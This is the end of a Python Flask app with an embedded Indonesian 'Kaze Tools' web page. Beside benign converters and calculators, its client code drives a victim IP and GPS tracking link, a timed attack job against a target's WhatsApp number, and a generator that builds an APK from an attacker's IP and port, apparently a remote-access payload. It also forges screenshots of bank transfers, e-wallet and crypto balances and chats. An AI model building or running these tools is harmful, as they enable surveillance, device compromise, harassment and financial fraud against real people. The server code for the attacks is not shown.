        scramble:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Scramble</h2><input id="sc-in"><div class="btn-row"><button onclick="doScramble()">Acak</button></div><div id="sc-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        randomname:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Random Name</h2><textarea id="rn-in" placeholder="Nama1, Nama2, Nama3" style="height:80px"></textarea><div class="btn-row"><button onclick="doRandomName()">Pilih</button></div><div id="rn2-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;font-size:24px;text-align:center"></div>`,
        numtowords:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Num→Words</h2><input id="ntw-in" type="number"><div class="btn-row"><button onclick="doNumWords()">Convert</button></div><div id="ntw-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        ipinfo:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>IP Info</h2><div class="btn-row"><button onclick="doIpInfo()">Cek IP</button></div><div id="ip-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;font-size:12px;white-space:pre-line"></div>`,
        webping:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Web Pinger</h2><input id="ping-url" placeholder="https://google.com"><div class="btn-row"><button onclick="doPing()">Ping</button></div><div id="ping-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;white-space:pre-line"></div>`,
        shorturl:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Short URL</h2><input id="short-in" placeholder="https://..."><div class="btn-row"><button onclick="doShort()">Pendekin</button></div><div id="short-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        chat:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Kaze AI</h2><div id="chat-box" style="height:200px;overflow-y:auto;background:#000;padding:10px;border-radius:10px;margin-bottom:12px"><div>Halo! Tanya apa saja.</div></div><div style="display:flex;gap:8px"><input id="chat-input" placeholder="Tanya..." style="margin:0;flex:1"><button onclick="sendChat()" style="flex:0 0 80px">Kirim</button></div>`
    };
    if(!T[id]){showToast('Fitur '+id+' belum tersedia');return}
    document.getElementById('tool-content').innerHTML=T[id];
    document.getElementById('tool-modal').style.display='flex';
}
function closeTool(){document.getElementById('tool-modal').style.display='none'}

// REAL
function genTrackLink(){const id=document.getElementById('trk-id').value||'target';document.getElementById('trk-res').innerText='Link siap:\n'+window.location.origin+'/api/track/'+encodeURIComponent(id)}
async function viewLogs(){const r=document.getElementById('trk-logs');r.innerText='Memuat...';try{const res=await fetch('/api/track-logs');const j=await res.json();if(j.ok&&j.logs.length){r.innerText=j.logs.map(l=>'['+new Date(l.time*1000).toLocaleString()+']\nIP: '+l.ip+'\nLoc: '+l.loc+'\nGPS: '+(l.lat!=='N/A'?l.lat+','+l.lon:'Denied')).join('\n\n')}else r.innerText='Belum ada log.'}catch(e){r.innerText='Gagal.'}}
async function startBugWa(){const t=document.getElementById('bwr-target').value;const sender=document.getElementById('bwr-sender').value;const m=document.getElementById('bwr-mode').value;const h=parseFloat(document.getElementById('bwr-hours').value)||1;const s=document.getElementById('bwr-status');if(!t)return s.innerText='Isi nomor target!';s.innerText='Memulai...';try{const r=await fetch('/api/bug-wa',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target:t,sender:sender,mode:m,hours:h})});const j=await r.json();if(!j.ok){s.innerText='GAGAL: '+j.error;return}s.innerText='Job: '+j.job_id+'\n'+j.message;setInterval(async()=>{try{const lr=await fetch('/api/bug-wa/log/'+j.job_id);const lj=await lr.json();if(lj.ok){s.innerText='Job: '+j.job_id+'\n'+j.message+'\n\n'+lj.log;s.scrollTop=s.scrollHeight}}catch(e){}},2500)}catch(e){s.innerText='Error: '+e.message}}
async function genApk(){const ip=document.getElementById('apk-ip').value;const port=document.getElementById('apk-port').value;const res=document.getElementById('apk-res');if(!ip)return res.innerText='Isi IP!';res.innerText='Compile...';try{const r=await fetch('/api/gen-apk',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,port})});if(r.ok){const blob=await r.blob();const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='kaze.apk';a.click();res.innerText='SUKSES!'}else{const j=await r.json();res.innerText='GAGAL: '+j.error}}catch(e){res.innerText='Error: '+e.message}}

// FAKE
function cap(elId,imgId,dlId,resId){const el=document.getElementById(elId);setTimeout(()=>{html2canvas(el,{scale:2}).then(c=>{document.getElementById(imgId).src=c.toDataURL();document.getElementById(dlId).href=c.toDataURL();document.getElementById(resId).style.display='block'})},300)}
function genFakeWa(){const n=document.getElementById('wa-name').value||'Kaze';const m=document.getElementById('wa-msg').value;if(!m)return;document.getElementById('fakewa-target-name').innerText=n;document.getElementById('fakewa-chat-area').innerHTML='<div style="max-width:80%;padding:8px 10px;font-size:14px;background:#d9fdd3;border-radius:10px 0 10px 10px;margin-left:auto;color:#000;box-shadow:0 1px 2px rgba(0,0,0,0.1)">'+m+'</div>';cap('fakewa-capture','fakewa-img','fakewa-dl','fakewa-result')}
function genFakeSms(){const n=document.getElementById('sms-name').value||'Kaze';const m=document.getElementById('sms-msg').value;if(!m)return;document.getElementById('sms-target-name').innerText=n;document.getElementById('sms-chat-area').innerHTML='<div style="max-width:80%;padding:8px 10px;font-size:14px;background:#e5e5ea;border-radius:15px;margin-left:auto;color:#000">'+m+'</div>';cap('fakesms-capture','fakesms-img','fakesms-dl','fakesms-result')}
function genFakeWaCall(){document.getElementById('call-name').innerText=document.getElementById('call-name').value||document.querySelector('#fakewacall-capture #call-name').innerText;cap('fakewacall-capture','fakewacall-img','fakewacall-dl','fakewacall-result')}
function genFakeWaContext(){const m=document.getElementById('ctx-msg').value;if(m)document.getElementById('ctx-msg').innerText=m;cap('fakewacontext-capture','fakewacontext-img','fakewacontext-dl','fakewacontext-result')}
function genFakeIosNotif(){const m=document.getElementById('ios-msg').value;if(m)document.getElementById('ios-notif-msg').innerText=m;cap('fakeiosnotif-capture','fakeiosnotif-img','fakeiosnotif-dl','fakeiosnotif-result')}
function genFakeTelegram(){const n=document.getElementById('tg-name').value||'Kaze';const m=document.getElementById('tg-msg').value;if(!m)return;document.getElementById('faketelegram-chat-area').innerHTML='<div style="max-width:80%;padding:8px 10px;font-size:14px;background:#2b5278;color:#fff;border-radius:10px;margin-left:auto">'+m+'</div>';cap('faketelegram-capture','faketelegram-img','faketelegram-dl','faketelegram-result')}
function genFakeGoogle(){const q=document.getElementById('g-query').value||'Kaze';document.getElementById('g-query-display').innerText=q;document.getElementById('g-query-res').innerText=q;cap('fakegoogle-capture','fakegoogle-img','fakegoogle-dl','fakegoogle-result')}
function genFakeDiscord(){const n=document.getElementById('dc-name').value||'User';const m=document.getElementById('dc-msg').value;if(!m)return;document.getElementById('dc-name').innerText=n;document.getElementById('dc-msg').innerText=m;cap('fakediscord-capture','fakediscord-img','fakediscord-dl','fakediscord-result')}
function genFakeBca(){document.getElementById('bca-c-target').innerText=document.getElementById('bca-target').value||'Budi';document.getElementById('bca-c-amount').innerText='Rp '+(document.getElementById('bca-amount').value||'1.000.000');cap('fakebca-capture','fakebca-img','fakebca-dl','fakebca-result')}
function genDana(){document.getElementById('dana-c-merchant').textContent=document.getElementById('dana-merchant').value||'QRISPAY';document.getElementById('dana-c-total').textContent='Rp'+(document.getElementById('dana-total').value||'5.255');cap('dana-capture-area','dana-img','dana-dl','dana-result')}
function genFakeIgProfile(){document.getElementById('igp-c-name').innerText=document.getElementById('igp-name').value||'username';cap('fakeigprofile-capture','fakeigprofile-img','fakeigprofile-dl','fakeigprofile-result')}
function genFakeTweet(){document.getElementById('ft-c-name').innerText=document.getElementById('ft-name').value||'User';document.getElementById('ft-c-msg').innerText=document.getElementById('ft-msg').value||'Tweet...';cap('faketweet-capture','faketweet-img','faketweet-dl','faketweet-result')}
function genFakePaypal(){document.getElementById('pp-c-amt').innerText=document.getElementById('pp-amount').value||'$100.00';document.getElementById('pp-c-name').innerText=document.getElementById('pp-name').value||'John Doe';cap('fakepaypal-capture','fakepaypal-img','fakepaypal-dl','fakepaypal-result')}
function genFakeShopee(){document.getElementById('sp-c-item').innerText=document.getElementById('sp-item').value||'Barang';document.getElementById('sp-c-price').innerText=document.getElementById('sp-price').value||'Rp 100.000';cap('fakeshopee-capture','fakeshopee-img','fakeshopee-dl','fakeshopee-result')}
function genFakeNetflix(){document.getElementById('nf-c-name').innerText=document.getElementById('nf-name').value||'User';cap('fakenetflix-capture','fakenetflix-img','fakenetflix-dl','fakenetflix-result')}
function genFakeSpotify(){document.getElementById('sp-c-title').innerText=document.getElementById('sp-title').value||'Lagu';document.getElementById('sp-c-artist').innerText=document.getElementById('sp-artist').value||'Artis';cap('fakespotify-capture','fakespotify-img','fakespotify-dl','fakespotify-result')}
function genFakeGopay(){document.getElementById('gp-c-bal').innerText=document.getElementById('gp-bal').value||'Rp 1.500.000';cap('fakegopay-capture','fakegopay-img','fakegopay-dl','fakegopay-result')}
function genFakeOvo(){document.getElementById('ovo-c-bal').innerText=document.getElementById('ovo-bal').value||'Rp 2.500.000';cap('fakeovo-capture','fakeovo-img','fakeovo-dl','fakeovo-result')}
function genFakeSteam(){document.getElementById('st-c-name').innerText=document.getElementById('st-name').value||'Player';cap('fakesteam-capture','fakesteam-img','fakesteam-dl','fakesteam-result')}
function genFakeCrypto(){document.getElementById('crypto-c-bal').innerText=document.getElementById('crypto-bal').value||'$ 15,000.00';document.getElementById('crypto-c-btc').innerText=document.getElementById('crypto-btc').value||'0.25 BTC';cap('fakecrypto-capture','fakecrypto-img','fakecrypto-dl','fakecrypto-result')}
function genFakeML(){document.getElementById('ml-c-name').innerText=document.getElementById('ml-name').value||'Player';cap('fakelobbyml-capture','fakelobbyml-img','fakelobbyml-dl','fakelobbyml-result')}
function genFakeMLChat(){document.getElementById('mlc-msg').innerText=document.getElementById('mlc-text').value||'boleh bntu push rank gak';cap('fakemlchat-capture','fakemlchat-img','fakemlchat-dl','fakemlchat-result')}
function genFakeMLProfile(){document.getElementById('mlp-c-name').innerText=document.getElementById('mlp-name').value||'Player';document.getElementById('mlp-c-rank').innerText=document.getElementById('mlp-rank').value||'Mythic';cap('fakemlprofile-capture','fakemlprofile-img','fakemlprofile-dl','fakemlprofile-result')}
function runFakeTerm(){const t=document.getElementById('term-in').value.toLowerCase();const r=document.getElementById('term-res');r.innerText+='\nroot@kaze:~# '+t+'\n';setTimeout(()=>{r.innerText+='[+] Executing '+t+'...\n[+] Scanning...\n[+] Access granted.\n';r.scrollTop=r.scrollHeight},800)}

// TOOLS
async function dlVideo(id,fmt){const url=document.getElementById(id).value;if(!url)return;showToast('DOWNLOADING...');const r=await fetch('/api/yt',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,format:fmt})});const b=await r.blob();const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='kaze.'+fmt;a.click();showToast('DONE');closeTool()}
function genEw(){const num=document.getElementById('ew-num').value;if(!num)return;const txt=document.getElementById('ew-type').value+': '+document.getElementById('ew-name').value+' - '+num;document.getElementById('ew-img').src='/api/qr?text='+encodeURIComponent(txt);document.getElementById('ew-dl').href='/api/qr-download?text='+encodeURIComponent(txt);document.getElementById('ew-result').style.display='block'}
function genWifi(){const ssid=document.getElementById('wifi-ssid').value;const pass=document.getElementById('wifi-pass').value;if(!ssid)return;const txt='WIFI:T:WPA;S:'+ssid+';P:'+pass+';;';document.getElementById('wifi-img').src='/api/qr?text='+encodeURIComponent(txt);document.getElementById('wifi-dl').href='/api/qr-download?text='+encodeURIComponent(txt);document.getElementById('wifi-result').style.display='block'}
async function genBrat(){const text=document.getElementById('brat-text').value;if(!text)return;const r=await fetch('/api/brat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text})});const b=await r.blob();const url=URL.createObjectURL(b);document.getElementById('brat-img').src=url;document.getElementById('brat-dl').href=url;document.getElementById('brat-result').style.display='block'}
async function processImg(type){const f=document.getElementById(type==='hd'?'hd-file':'comp-file');if(!f.files[0])return;const fd=new FormData();fd.append('image',f.files[0]);const res=await fetch(type==='hd'?'/api/hd-photo':'/api/compress',{method:'POST',body:fd});const url=URL.createObjectURL(await res.blob());document.getElementById(type+'-img').src=url;document.getElementById(type+'-dl').href=url;document.getElementById(type+'-result').style.display='block'}
async function convertPdf(){const f=document.getElementById('pdf-files');if(!f.files.length)return;const fd=new FormData();for(let i=0;i<f.files.length;i++)fd.append('images',f.files[i]);const res=await fetch('/api/img2pdf',{method:'POST',body:fd});const a=document.createElement('a');a.href=URL.createObjectURL(await res.blob());a.download='Doc.pdf';a.click();closeTool()}
async function genHash(){const t=document.getElementById('hash-input').value;const buf=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(t));document.getElementById('hash-res').innerText=Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');document.getElementById('hash-res').style.display='block'}
function processB64(m){const t=document.getElementById('b64-input').value;try{document.getElementById('b64-res').innerText=m==='encode'?btoa(t):atob(t)}catch(e){document.getElementById('b64-res').innerText='Error'}document.getElementById('b64-res').style.display='block'}
function genPass(){const len=parseInt(document.getElementById('pass-len').value)||16;const c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()';let p='';for(let i=0;i<len;i++)p+=c.charAt(Math.floor(Math.random()*c.length));document.getElementById('pass-res').innerText=p}
function doUuid(){document.getElementById('uuid-res').innerText=crypto.randomUUID()}
function t2b(){const t=document.getElementById('t2b-in').value;document.getElementById('t2b-res').innerText=t.split('').map(c=>c.charCodeAt(0).toString(2).padStart(8,'0')).join(' ')}
function b2t(){const b=document.getElementById('b2t-in').value;try{document.getElementById('b2t-res').innerText=b.split(' ').map(x=>String.fromCharCode(parseInt(x,2))).join('')}catch(e){document.getElementById('b2t-res').innerText='Error'}}
function doCase(m){const t=document.getElementById('case-in').value;document.getElementById('case-res').innerText=m==='upper'?t.toUpperCase():m==='lower'?t.toLowerCase():t.replace(/\w\S*/g,x=>x.charAt(0).toUpperCase()+x.substr(1).toLowerCase())}
function genRand(){const a=parseInt(document.getElementById('rand-min').value)||1;const b=parseInt(document.getElementById('rand-max').value)||100;document.getElementById('rand-res').innerText=Math.floor(Math.random()*(b-a+1))+a}
function flipCoin(){document.getElementById('coin-res').innerText=Math.random()<0.5?'HEADS':'TAILS'}
function rollDice(){document.getElementById('dice-res').innerText=Math.floor(Math.random()*6)+1}
function countWords(){const t=document.getElementById('wc-in').value;document.getElementById('wc-res').innerText='Kata: '+(t.trim()?t.trim().split(/\s+/).length:0)+' | Karakter: '+t.length}
function revText(){document.getElementById('tr-res').innerText=document.getElementById('tr-in').value.split('').reverse().join('')}
function t2h(){const t=document.getElementById('t2h-in').value;document.getElementById('t2h-res').innerText=t.split('').map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('')}
function h2t(){const h=document.getElementById('h2t-in').value;try{document.getElementById('h2t-res').innerText=h.match(/.{1,2}/g).map(x=>String.fromCharCode(parseInt(x,16))).join('')}catch(e){document.getElementById('h2t-res').innerText='Error'}}
function doUrl(m){const u=document.getElementById('url-in').value;document.getElementById('url-res').innerText=m==='encode'?encodeURIComponent(u):decodeURIComponent(u)}
function doQrText(){const t=document.getElementById('qr-in').value;if(!t)return;document.getElementById('qr-img').src='/api/qr?text='+encodeURIComponent(t);document.getElementById('qr-dl').href='/api/qr-download?text='+encodeURIComponent(t);document.getElementById('qr-result').style.display='block'}
function doJsonFmt(){const t=document.getElementById('json-in').value;try{document.getElementById('json-res').innerText=JSON.stringify(JSON.parse(t),null,2)}catch(e){document.getElementById('json-res').innerText='Invalid JSON'}}
function doB64Img(){const t=document.getElementById('b64in').value;const img=document.getElementById('b64-img');if(t){img.src=t.startsWith('data:')?t:'data:image/png;base64,'+t;img.style.display='block'}}
function doImgB64(){const f=document.getElementById('img-in').files[0];if(!f)return;const r=new FileReader();r.onload=()=>{document.getElementById('img-res').innerText=r.result};r.readAsDataURL(f)}
function doColorPick(){const c=document.getElementById('color-in').value;const p=document.getElementById('color-preview');p.style.background=c;p.innerText=c}
function doLorem(){document.getElementById('lorem-res').innerText='Lorem ipsum dolor sit amet, consectetur adipiscing elit.'}
function doTts(){const t=document.getElementById('tts-in').value;if(t){const u=new SpeechSynthesisUtterance(t);window.speechSynthesis.speak(u)}}
function doMdPrev(){let t=document.getElementById('md-in').value;t=t.replace(/^### (.*$)/gim,'<h3>$1</h3>').replace(/^## (.*$)/gim,'<h2>$1</h2>').replace(/^# (.*$)/gim,'<h1>$1</h1>').replace(/\*\*(.*)\*\*/gim,'<b>$1</b>');document.getElementById('md-res').innerHTML=t}
function doCaesar(){const t=document.getElementById('caesar-in').value;const s=parseInt(document.getElementById('caesar-shift').value)||3;document.getElementById('caesar-res').innerText=t.replace(/[a-z]/gi,c=>String.fromCharCode((c<='Z'?90:122)>=(c=c.charCodeAt(0)+s)?c:c-26))}
function doMorse(){const t=document.getElementById('morse-in').value.toUpperCase();const m={'A':'.-','B':'-...','C':'-.-.','D':'-..','E':'.','F':'..-.','G':'--.','H':'....','I':'..','J':'.---','K':'-.-','L':'.-..','M':'--','N':'-.','O':'---','P':'.--.','Q':'--.-','R':'.-.','S':'...','T':'-','U':'..-','V':'...-','W':'.--','X':'-..-','Y':'-.--','Z':'--..','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.','0':'-----'};document.getElementById('morse-res').innerText=t.split('').map(c=>m[c]||c).join(' ')}
function doT2Ascii(){document.getElementById('t2a-res').innerText=document.getElementById('t2a-in').value.split('').map(c=>c.charCodeAt(0)).join(' ')}
function doBase32(m){const t=document.getElementById('b32-in').value;try{if(m==='enc'){const b=btoa(t).replace(/=/g,'');const c='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';let r='',bits=0,val=0;for(let i=0;i<b.length;i++){val=(val<<8)|b.charCodeAt(i);bits+=8;while(bits>=5){r+=c[(val>>>(bits-5))&31];bits-=5}}if(bits>0)r+=c[(val<<(5-bits))&31];document.getElementById('b32-res').innerText=r}else{const c='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';let bits=0,val=0,r='';for(let i=0;i<t.length;i++){const x=c.indexOf(t[i].toUpperCase());if(x===-1)continue;val=(val<<5)|x;bits+=5;if(bits>=8){r+=String.fromCharCode((val>>>(bits-8))&255);bits-=8}}document.getElementById('b32-res').innerText=atob(r)}}catch(e){document.getElementById('b32-res').innerText='Error'}}
function doAscii2T(){try{document.getElementById('a2t-res').innerText=document.getElementById('a2t-in').value.split(' ').map(x=>String.fromCharCode(parseInt(x))).join('')}catch(e){document.getElementById('a2t-res').innerText='Error'}}
function doHex2Rgb(){const h=document.getElementById('h2r-in').value.replace('#','');try{const r=parseInt(h.substring(0,2),16),g=parseInt(h.substring(2,4),16),b=parseInt(h.substring(4,6),16);document.getElementById('h2r-res').innerText='rgb('+r+', '+g+', '+b+')'}catch(e){document.getElementById('h2r-res').innerText='Error'}}
function doAes(m){const t=document.getElementById('aes-in').value;const k=document.getElementById('aes-key').value;const r=document.getElementById('aes-res');if(!t||!k)return r.innerText='Isi teks dan kunci';try{if(typeof CryptoJS==='undefined')return r.innerText='CryptoJS gagal load';if(m==='enc')r.innerText=CryptoJS.AES.encrypt(t,k).toString();else r.innerText=CryptoJS.AES.decrypt(t,k).toString(CryptoJS.enc.Utf8)||'Gagal'}catch(e){r.innerText='Error'}}
async function doMd5(){const t=document.getElementById('md5-in').value;const buf=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(t));document.getElementById('md5-res').innerText=Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('')}
function doCalc(){try{document.getElementById('calc-res').innerText=eval(document.getElementById('calc-in').value)}catch(e){document.getElementById('calc-res').innerText='Error'}}
function doBmi(){const w=parseFloat(document.getElementById('bmi-weight').value),h=parseFloat(document.getElementById('bmi-height').value)/100;if(!w||!h)return;const b=(w/(h*h)).toFixed(1);const s=b<18.5?'Kurus':b<25?'Normal':b<30?'Gemuk':'Obesitas';document.getElementById('bmi-res').innerText='BMI: '+b+' ('+s+')'}
let swInt,swSec=0;
function swFmt(s){const h=String(Math.floor(s/3600)).padStart(2,'0'),m=String(Math.floor((s%3600)/60)).padStart(2,'0'),x=String(s%60).padStart(2,'0');return h+':'+m+':'+x}
function swStart(){if(swInt)return;swInt=setInterval(()=>{swSec++;document.getElementById('sw-time').innerText=swFmt(swSec)},1000)}
function swStop(){clearInterval(swInt);swInt=null}
function swReset(){swStop();swSec=0;document.getElementById('sw-time').innerText=swFmt(0)}
function doTimestamp(){const now=Math.floor(Date.now()/1000);const t=parseInt(document.getElementById('ts-in').value);let out='Now: '+now+'\n';if(!isNaN(t))out+='Input: '+new Date(t*1000).toLocaleString();document.getElementById('ts-res').innerText=out}
function doAge(){const d=document.getElementById('ac-dob').value;if(!d)return;const b=new Date(d),n=new Date();let a=n.getFullYear()-b.getFullYear();const m=n.getMonth()-b.getMonth();if(m<0||(m===0&&n.getDate()<b.getDate()))a--;document.getElementById('ac-res').innerText='Umur: '+a+' tahun'}
function doRoman(){const n=parseInt(document.getElementById('rn-in').value);if(!n)return;const m={1000:'M',900:'CM',500:'D',400:'CD',100:'C',90:'XC',50:'L',40:'XL',10:'X',9:'IX',5:'V',4:'IV',1:'I'};let r='',num=n;for(let k in m){while(num>=k){r+=m[k];num-=k}}document.getElementById('rn-res').innerText=r}
function doFib(){const n=parseInt(document.getElementById('fb-in').value)||10;let a=0,b=1,r=[];for(let i=0;i<n;i++){r.push(a);[a,b]=[b,a+b]}document.getElementById('fb-res').innerText=r.join(', ')}
function doPrime(){const n=parseInt(document.getElementById('pc-in').value);if(!n)return;let p=n>1;for(let i=2;i<=Math.sqrt(n);i++){if(n%i===0){p=false;break}}document.getElementById('pc-res').innerText=p?'Prima':'Bukan Prima'}
function doFact(){const n=parseInt(document.getElementById('ft-in').value);if(!n||n<0)return;let f=1;for(let i=1;i<=n;i++)f*=i;document.getElementById('ft-res').innerText=f}
function doPalin(){const t=document.getElementById('pl-in').value.replace(/[^a-zA-Z]/g,'').toLowerCase();document.getElementById('pl-res').innerText=t===t.split('').reverse().join('')?'Palindrome':'Bukan'}
function doVowel(){document.getElementById('vc-res').innerText=(document.getElementById('vc-in').value.match(/[aeiouAEIOU]/g)||[]).length}
function doPercent(){const n=parseFloat(document.getElementById('pc-num').value),p=parseFloat(document.getElementById('pc-pct').value);if(!n||!p)return;document.getElementById('pc-res2').innerText=p+'% dari '+n+' = '+(n*p/100).toFixed(2)}
function doTip(){const b=parseFloat(document.getElementById('tc-bill').value),p=parseFloat(document.getElementById('tc-pct').value),pp=parseInt(document.getElementById('tc-people').value)||1;if(!b||!p)return;const tip=b*p/100,t=b+tip;document.getElementById('tc-res').innerText='Tip: '+tip.toFixed(2)+'\nTotal: '+t.toFixed(2)+'\nPer Orang: '+(t/pp).toFixed(2)}
function doTemp(){const v=parseFloat(document.getElementById('tempc-in').value);if(isNaN(v))return;document.getElementById('tempc-res').innerText='C: '+v+'\nF: '+(v*9/5+32).toFixed(2)+'\nK: '+(v+273.15).toFixed(2)}
function doWeight(){const kg=parseFloat(document.getElementById('wc-in').value);if(!kg)return;document.getElementById('weightc-res').innerText=kg+' kg\n'+(kg*2.20462).toFixed(2)+' lbs\n'+(kg*1000).toFixed(0)+' g'}
function doLeap(){const y=parseInt(document.getElementById('ly-in').value);document.getElementById('ly-res').innerText=(y%4===0&&y%100!==0)||y%400===0?'Kabisat':'Bukan'}
function doGcdLcm(){let a=parseInt(document.getElementById('gl-1').value),b=parseInt(document.getElementById('gl-2').value);if(!a||!b)return;const gcd=(x,y)=>y===0?x:gcd(y,x%y);const g=gcd(a,b);document.getElementById('gl-res').innerText='GCD: '+g+'\nLCM: '+(a*b)/g}
function doRandColor(){document.getElementById('rc-res').innerText='#'+Math.floor(Math.random()*16777215).toString(16).padStart(6,'0')}
function doScramble(){document.getElementById('sc-res').innerText=document.getElementById('sc-in').value.split('').sort(()=>Math.random()-0.5).join('')}
function doRandomName(){const t=document.getElementById('rn-in').value;const arr=t.split(',').map(x=>x.trim()).filter(x=>x);if(!arr.length)return;document.getElementById('rn2-res').innerText=arr[Math.floor(Math.random()*arr.length)]}
function doNumWords(){const n=parseInt(document.getElementById('ntw-in').value);if(isNaN(n))return;const w=['Nol','Satu','Dua','Tiga','Empat','Lima','Enam','Tujuh','Delapan','Sembilan','Sepuluh'];document.getElementById('ntw-res').innerText=(n>=0&&n<=10)?w[n]:'Angka terlalu besar'}
async function doIpInfo(){const r=document.getElementById('ip-res');r.innerText='Loading...';try{const res=await fetch('http://ip-api.com/json/');const j=await res.json();r.innerText='IP: '+j.query+'\nISP: '+j.isp+'\nKota: '+j.city+'\nNegara: '+j.country}catch(e){r.innerText='Error'}}
async function doPing(){const u=document.getElementById('ping-url').value;if(!u)return;const r=document.getElementById('ping-res');r.innerText='Ping...';try{const t=Date.now();await fetch(u,{mode:'no-cors'});r.innerText='OK ('+(Date.now()-t)+'ms)'}catch(e){r.innerText='Timeout'}}
async function doShort(){const u=document.getElementById('short-in').value;if(!u)return;const r=document.getElementById('short-res');r.innerText='Memproses...';try{const res=await fetch('https://tinyurl.com/api-create.php?url='+encodeURIComponent(u));r.innerText=await res.text()}catch(e){r.innerText='Error'}}
async function sendChat(){const input=document.getElementById('chat-input');const msg=input.value.trim();if(!msg)return;const box=document.getElementById('chat-box');box.innerHTML+='<div style="text-align:right;color:var(--accent);margin-bottom:10px"><b>You:</b> '+msg+'</div>';input.value='';const lid='load-'+Date.now();box.innerHTML+='<div id="'+lid+'">...</div>';try{const r=await fetch('/api/chat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({msg})});const j=await r.json();document.getElementById(lid).remove();box.innerHTML+='<div style="margin-bottom:10px"><b>Kaze AI:</b> '+j.reply+'</div>';box.scrollTop=box.scrollHeight}catch(e){document.getElementById(lid).innerText='Error'}}

const tracks=['Tipu Daya The Panturas','Akun Payung Teduh','Evaluasi Hindia'];let trackIndex=0,isPlaying=false;const audio=document.getElementById('bg-music'),playBtn=document.getElementById('play-btn');
async function loadTrack(index){try{const res=await fetch('/api/music-stream?q='+encodeURIComponent(tracks[index]));const data=await res.json();if(data.url){audio.src=data.url;if(isPlaying)audio.play().catch(e=>console.log(e))}}catch(e){}}
function togglePlay(){if(isPlaying){audio.pause();playBtn.className='fa-solid fa-play'}else{if(!audio.src)loadTrack(trackIndex);audio.play().catch(e=>console.log(e));playBtn.className='fa-solid fa-pause'}isPlaying=!isPlaying}
function nextTrack(){trackIndex=(trackIndex+1)%tracks.length;loadTrack(trackIndex);if(isPlaying)audio.play().catch(e=>console.log(e))}
function prevTrack(){trackIndex=(trackIndex-1+tracks.length)%tracks.length;loadTrack(trackIndex);if(isPlaying)audio.play().catch(e=>console.log(e))}
loadTrack(trackIndex);
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
</body>
</html>
"""

@app.route("/")
def home(): return render_template_string(PAGE)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "8080"))
    print(f"KAZE TOOLS running at http://0.0.0.0:{port}")
    app.run(host="0.0.0.0", port=port, threaded=True)
